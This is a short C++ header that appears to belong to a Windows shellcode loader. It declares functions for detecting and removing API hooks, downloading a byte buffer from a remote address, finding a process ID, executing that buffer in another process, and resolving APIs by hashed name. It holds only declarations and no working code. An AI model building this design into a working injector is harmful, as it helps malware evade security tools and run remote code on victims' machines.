#pragma once
#include <vector>
#include <Windows.h>

// Functions definitions
BOOL isItHooked(LPVOID addr);
void unhook();
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
DWORD GetPID();
void execution(std::vector<BYTE> sh, DWORD exPID);

FARPROC CustomGetProcAddress(IN HMODULE hModule, IN DWORD lpApiName);
HMODULE CustomGetModuleHandle(IN LPCWSTR szModuleName);
